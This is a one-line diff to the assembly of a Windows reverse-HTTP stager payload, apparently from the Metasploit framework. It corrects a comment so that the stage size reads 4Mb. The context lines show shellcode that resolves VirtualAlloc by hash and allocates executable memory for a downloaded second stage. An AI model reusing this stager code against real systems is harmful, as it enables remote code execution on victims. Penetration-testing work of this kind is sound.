@@ -277,7 +277,7 @@ module Payload::Windows::ReverseHttp
         allocate_memory:
           push.i8 0x40           ; PAGE_EXECUTE_READWRITE
           push 0x1000            ; MEM_COMMIT
-          push 0x00400000        ; Stage allocation (8Mb ought to do us)
+          push 0x00400000        ; Stage allocation (4Mb ought to do us)
           push ebx               ; NULL as we dont care where the allocation is
           push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
           call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
